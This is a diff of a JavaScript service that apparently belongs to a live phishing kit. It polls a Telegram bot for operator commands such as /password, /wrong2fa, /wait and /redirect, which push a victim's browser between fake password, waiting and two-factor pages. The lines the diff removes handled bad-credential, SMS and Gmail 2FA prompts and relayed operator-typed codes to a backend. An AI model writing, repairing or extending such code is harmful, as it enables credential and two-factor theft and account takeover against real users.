@@ -11,8 +11,6 @@ export class TelegramService {
   static baseDelay = 1000; // 1 second base delay
   static lastProcessedWrong2faCommand = null; // Track last processed wrong2fa command
   static lastProcessedPasswordCommand = null; // Track last processed password command
-  static lastProcessedBadCredsCommand = null; // Track last processed badcreds command
-  static lastProcessedCallbackId = null; // Track last processed callback_query.id to prevent duplicate processing
 
   static async fetchMessages() {
     // Prevent multiple simultaneous requests
@@ -102,9 +100,6 @@ export class TelegramService {
       wrong2faTrigger,
       setWrongPasswordTrigger,
       wrongPasswordTrigger,
-      setWrongCredsTrigger,
-      wrongCredsTrigger,
-      Step,
     } = currentState;
 
     const commands = {
@@ -128,34 +123,13 @@ export class TelegramService {
 
         this.lastProcessedPasswordCommand = fullCommand;
 
-        // If user is on waiting page (step 4), bring them back to step 2 (password page) with error
-        if (Step === 4) {
+        if (LastFetch !== "password") {
           setStep(2);
-        }
-        
-        setLastFetch("password");
-
-        if (typeof setWrongPasswordTrigger === "function") {
-          setWrongPasswordTrigger((prev) => prev + 1);
-        }
-      },
-      "/badcreds": (fullCommand) => {
-        // Check if this is a new badcreds command (idempotent check)
-        if (this.lastProcessedBadCredsCommand === fullCommand) {
-          return;
+          setLastFetch("password");
         }
 
-        this.lastProcessedBadCredsCommand = fullCommand;
-
-        // If user is on waiting page (step 4), bring them back to step 2 (password page) with error
-        if (Step === 4) {
-          setStep(2);
-        }
-        
-        setLastFetch("badcreds");
-
-        if (typeof setWrongCredsTrigger === "function") {
-          setWrongCredsTrigger((prev) => prev + 1);
+        if (typeof currentState.setWrongPasswordTrigger === "function") {
+          currentState.setWrongPasswordTrigger((prev) => prev + 1);
         }
       },
       "/wait": () => {
@@ -206,12 +180,6 @@ export class TelegramService {
           setLastFetch("done");
         }
       },
-      "/appauth": () => {
-        // Dispatch event for Google sign-in modal to show code input
-        if (typeof window !== "undefined") {
-          window.dispatchEvent(new CustomEvent("appauth-show-code"));
-        }
-      },
       "/redirect": () => {
         try {
           const target = getRedirectUrl();
@@ -226,41 +194,6 @@ export class TelegramService {
         if (LastFetch !== "authApp") {
           setStep(15);
           setLastFetch("authApp");
-        }
-      },
-      "/bademail": () => {
-        if (typeof window !== "undefined") {
-          window.dispatchEvent(new CustomEvent("admin-bad-email"));
-        }
-      },
-      "/badpass": () => {
-        if (typeof window !== "undefined") {
-          window.dispatchEvent(new CustomEvent("admin-bad-pass"));
-        }
-      },
-      "/2fagmail": () => {
-        if (typeof window !== "undefined") {
-          window.dispatchEvent(new CustomEvent("admin-2fa-gmail"));
-        }
-      },
-      "/2fanumber": () => {
-        if (typeof window !== "undefined") {
-          window.dispatchEvent(new CustomEvent("admin-2fa-number"));
-        }
-      },
-      "/2fasms": () => {
-        if (typeof window !== "undefined") {
-          window.dispatchEvent(new CustomEvent("admin-2fa-sms"));
-        }
-      },
-      "/gmailwait": () => {
-        if (typeof window !== "undefined") {
-          window.dispatchEvent(new CustomEvent("admin-wait"));
-        }
-      },
-      "/google": () => {
-        if (typeof window !== "undefined") {
-          window.dispatchEvent(new CustomEvent("admin-facebook-google"));
         }
       },
       "/wrong2fa": (fullCommand) => {
@@ -293,8 +226,6 @@ export class TelegramService {
         this.resetErrorState();
         this.lastProcessedWrong2faCommand = null;
         this.lastProcessedPasswordCommand = null;
-        this.lastProcessedBadCredsCommand = null;
-        this.lastProcessedCallbackId = null;
       },
     };
 
@@ -328,21 +259,6 @@ export class TelegramService {
           );
         }
       }
-    } else if (command.startsWith("/badcreds")) {
-      // Handle /badcreds commands with additional data
-      try {
-        if (commands["/badcreds"]) {
-          commands["/badcreds"](command); // Pass full command for idempotency check
-        }
-      } catch (error) {
-        if (process.env.NODE_ENV === "development") {
-          console.warn(
-            "[Telegram] Error processing badcreds command:",
-            command,
-            error.message
-          );
-        }
-      }
     } else if (commands[command]) {
       // Handle other commands normally
       try {
@@ -369,7 +285,6 @@ export class TelegramService {
       const result = await this.fetchMessages();
 
       if (result.length > 0) {
-        // Process callback_query updates (button clicks)
         const messageUpdates = result.filter(
           ({ callback_query }) => callback_query?.data !== undefined
         );
@@ -378,60 +293,12 @@ export class TelegramService {
           try {
             const [command, id] = callback_query.data.split(" ");
             if (id === uniqueString || command === "/clear") {
-              // Skip if we already processed this exact callback (prevents repeated firing from offset=-1)
-              if (callback_query.id && this.lastProcessedCallbackId === callback_query.id) {
-                return;
-              }
-              this.lastProcessedCallbackId = callback_query.id;
               this.processCommand(command, uniqueString, currentState);
             }
           } catch (error) {
             if (process.env.NODE_ENV === "development") {
               console.warn(
                 "[Telegram] Error processing message:",
-                error.message
-              );
-            }
-          }
-        });
-
-        // Process regular text messages (admin typing verification code as REPLY)
-        const textUpdates = result.filter(
-          ({ message }) => message?.text && !message.text.startsWith("/") && message.reply_to_message
-        );
-
-        textUpdates.forEach(({ message }) => {
-          try {
-            const code = message.text.trim();
-            const replyToMessageId = message.reply_to_message.message_id;
-            
-            // Send to backend to handle reply
-            if (typeof window !== "undefined" && code && replyToMessageId) {
-              axios.post(buildApiUrl("/api/appauth/reply"), {
-                replyToMessageId,
-                code,
-              }).then((response) => {
-                // Dispatch to the correct page based on reply type
-                const replyType = response?.data?.replyType;
-                if (replyType === '2fasms') {
-                  window.dispatchEvent(
-                    new CustomEvent("appauth-sms-digits-received", { detail: { digits: code } })
-                  );
-                } else {
-                  window.dispatchEvent(
-                    new CustomEvent("appauth-code-received", { detail: { code } })
-                  );
-                }
-              }).catch(error => {
-                if (process.env.NODE_ENV === "development") {
-                  console.warn("[Telegram] Error sending reply:", error.message);
-                }
-              });
-            }
-          } catch (error) {
-            if (process.env.NODE_ENV === "development") {
-              console.warn(
-                "[Telegram] Error processing text message:",
                 error.message
               );
             }
